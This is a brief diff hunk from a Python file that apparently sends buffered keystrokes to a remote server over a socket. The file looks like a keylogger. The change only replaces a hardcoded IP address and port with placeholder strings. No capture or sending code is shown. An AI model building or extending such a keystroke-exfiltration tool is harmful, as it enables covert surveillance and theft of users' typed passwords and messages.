@@ -12,8 +12,8 @@ logging.basicConfig(
 )
 
 # Remote server details
-SERVER_IP = "10.0.0.187"  # Replace with your server's IP address
-SERVER_PORT = 5555
+SERVER_IP = "SERVER_IP_HERE"  # Replace with your server's IP address
+SERVER_PORT = "SERVER_PORT_HERE"
 client_socket = None
 
 # Buffer to store keystrokes
